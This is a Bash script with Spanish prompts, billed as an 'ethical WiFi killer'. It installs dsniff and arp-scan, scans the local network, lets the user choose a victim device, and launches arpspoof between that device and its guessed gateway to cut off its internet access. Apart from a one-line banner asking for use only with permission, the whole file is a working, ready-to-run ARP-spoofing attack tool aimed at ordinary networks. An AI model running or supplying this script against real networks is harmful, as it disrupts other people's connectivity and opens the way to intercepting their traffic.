#!/bin/bash

# ==============================
#  WiFi Killer Ético by David
# ==============================

ROJO="\e[31m"
VERDE="\e[32m"
AMARILLO="\e[33m"
AZUL="\e[34m"
RESET="\e[0m"

banner_wifi() {
  clear
  echo -e "${AZUL}"
  cat << "EOF"
                                                                                                                                                                
██     ██ ██ ███████ ██     ██   ██ ██ ██      ██      ███████ ██████  
██     ██ ██ ██      ██     ██  ██  ██ ██      ██      ██      ██   ██ 
██  █  ██ ██ █████   ██     █████   ██ ██      ██      █████   ██████  
██ ███ ██ ██ ██      ██     ██  ██  ██ ██      ██      ██      ██   ██ 
 ███ ███  ██ ██      ██     ██   ██ ██ ███████ ███████ ███████ ██   ██ 
                                                                       
                                                                                                                                                                                                                                
   WIFI KILLER (ARP SPOOF)
EOF
  echo -e "${RESET}"
  echo -e "${AMARILLO}Usa este script SOLO en entornos de prueba y con permiso.${RESET}"
  echo
}

ask_install() {
  local pkg="$1"
  echo -e "${AMARILLO}[!] Falta el paquete '${pkg}'.${RESET}"
  read -rp "$(echo -e "${AZUL}[?] ¿Quieres instalarlo automáticamente? (s/N): ${RESET}")" r
  if [[ "$r" == "s" || "$r" == "S" ]]; then
    echo -e "${VERDE}[*] Instalando '${pkg}'...${RESET}"
    sudo apt update && sudo apt install -y "$pkg" || {
      echo -e "${ROJO}[!] Error instalando '${pkg}'.${RESET}"
      exit 1
    }
  else
    echo -e "${ROJO}[!] No se puede continuar sin '${pkg}'.${RESET}"
    exit 1
  fi
}

check_tool() {
  local bin_name="$1"
  local pkg_name="$2"
  if ! command -v "$bin_name" >/dev/null 2>&1; then
    ask_install "$pkg_name"
    if ! command -v "$bin_name" >/dev/null 2>&1; then
      echo -e "${ROJO}[!] '${bin_name}' sigue sin estar disponible tras la instalación.${RESET}"
      exit 1
    fi
  fi
}

calc_gateway() {
  local ip="$1"
  echo "$ip" | sed -E 's/[0-9]+$/1/'
}

cleanup() {
  echo
  echo -e "${AMARILLO}[*] Deteniendo arpspoof y saliendo...${RESET}"
  pkill -f "arpspoof -i $IFACE -t $TARGET_IP $GATEWAY_IP" >/dev/null 2>&1
  exit 0
}
trap cleanup INT

auto_detect_iface() {
  local iface
  iface=$(ip route 2>/dev/null | awk '/default/ {print $5; exit}')
  if [[ -n "$iface" ]]; then
    echo "$iface"
  else
    iface=$(ls /sys/class/net | grep -E '^(e|w|en|wl)' | head -n 1)
    echo "$iface"
  fi
}

select_iface_manual() {
  echo -e "${AZUL}[?] Selecciona una interfaz de red:${RESET}"
  local ifaces=()
  local i=1
  while read -r dev; do
    ifaces+=("$dev")
    echo "  $i) $dev"
    ((i++))
  done < <(ls /sys/class/net)

  read -rp "$(echo -e "${AZUL}[?] Opción: ${RESET}")" opt
  if ! [[ "$opt" =~ ^[0-9]+$ ]] || (( opt < 1 || opt > ${#ifaces[@]} )); then
    echo -e "${ROJO}[!] Opción inválida.${RESET}"
    exit 1
  fi
  echo "${ifaces[$((opt-1))]}"
}

scan_network_and_select_target() {
  echo -e "${VERDE}[*] Escaneando la red con arp-scan...${RESET}"
  local i=1
  local lines=()
  while IFS=$'\t' read -r ip mac name; do
    [[ -z "$ip" || "$ip" =~ Interface: ]] && continue
    lines+=("$ip|$mac|$name")
    printf "  %2d) IP: %-15s  MAC: %-17s  INFO: %s\n" "$i" "$ip" "$mac" "$name"
    ((i++))
  done < <(sudo arp-scan --interface="$IFACE" --localnet 2>/dev/null)

  if (( ${#lines[@]} == 0 )); then
    echo -e "${ROJO}[!] No se encontraron dispositivos. Revisa la interfaz o la red.${RESET}"
    exit 1
  fi

  echo
  read -rp "$(echo -e "${AZUL}[?] Selecciona el número del dispositivo objetivo: ${RESET}")" sel
  if ! [[ "$sel" =~ ^[0-9]+$ ]] || (( sel < 1 || sel > ${#lines[@]} )); then
    echo -e "${ROJO}[!] Opción inválida.${RESET}"
    exit 1
  fi

  local selected="${lines[$((sel-1))]}"
  TARGET_IP="${selected%%|*}"
  local rest="${selected#*|}"
  TARGET_MAC="${rest%%|*}"
  TARGET_INFO="${rest#*|}"

  echo
  echo -e "${VERDE}[*] Dispositivo seleccionado:${RESET}"
  echo -e "    IP:   ${TARGET_IP}"
  echo -e "    MAC:  ${TARGET_MAC}"
  echo -e "    INFO: ${TARGET_INFO}"
}

banner_wifi

# Requisitos: arpspoof (dsniff) y arp-scan
check_tool "arpspoof" "dsniff"      # arpspoof viene en el paquete dsniff [web:13]
check_tool "arp-scan" "arp-scan"    # herramienta arp-scan [web:41][web:52]

echo -e "${AZUL}[?] Modo de selección de interfaz:${RESET}"
echo "  1) AUTO (detectar interfaz por defecto)"
echo "  2) MANUAL (elegir interfaz)"
read -rp "$(echo -e "${AZUL}[?] Opción: ${RESET}")" MODE_IFACE

case "$MODE_IFACE" in
  1)
    IFACE=$(auto_detect_iface)
    if [[ -z "$IFACE" ]]; then
      echo -e "${ROJO}[!] No se pudo detectar la interfaz automáticamente.${RESET}"
      exit 1
    fi
    echo -e "${VERDE}[*] Interfaz detectada automáticamente:${RESET} $IFACE"
    ;;
  2)
    IFACE=$(select_iface_manual)
    echo -e "${VERDE}[*] Interfaz seleccionada:${RESET} $IFACE"
    ;;
  *)
    echo -e "${ROJO}[!] Opción inválida.${RESET}"
    exit 1
    ;;
esac

echo
echo -e "${AZUL}[?] Modo de selección de objetivo:${RESET}"
echo "  1) IP manual"
echo "  2) Escanear red y elegir dispositivo (arp-scan)"
read -rp "$(echo -e "${AZUL}[?] Opción: ${RESET}")" MODE_TARGET

case "$MODE_TARGET" in
  1)
    read -rp "$(echo -e "${AZUL}[?] IP objetivo (víctima, ej: 192.168.0.15): ${RESET}")" TARGET_IP
    [[ -z "$TARGET_IP" ]] && { echo -e "${ROJO}[!] Debes introducir una IP.${RESET}"; exit 1; }
    ;;
  2)
    scan_network_and_select_target
    ;;
  *)
    echo -e "${ROJO}[!] Opción inválida.${RESET}"
    exit 1
    ;;
esac

GATEWAY_IP=$(calc_gateway "$TARGET_IP")

echo
echo -e "${VERDE}[*] Interfaz: ${RESET}$IFACE"
echo -e "${VERDE}[*] IP objetivo: ${RESET}$TARGET_IP"
echo -e "${VERDE}[*] Puerta de enlace calculada: ${RESET}$GATEWAY_IP"
echo
echo -e "${AMARILLO}[!] Mientras arpspoof esté corriendo, el objetivo puede perder salida a internet.${RESET}"
echo -e "${AMARILLO}[!] Pulsa CTRL+C para detener el ataque y restaurar la red (en la mayoría de casos).${RESET}"
echo

read -rp "$(echo -e "${AZUL}[?] ¿Iniciar ataque ARP spoofing? (s/N): ${RESET}")" RESP
if [[ "$RESP" != "s" && "$RESP" != "S" ]]; then
  echo -e "${ROJO}[-] Ataque cancelado.${RESET}"
  exit 0
fi

echo -e "${VERDE}[*] Iniciando ARP spoofing...${RESET}"
echo
sudo arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY_IP"
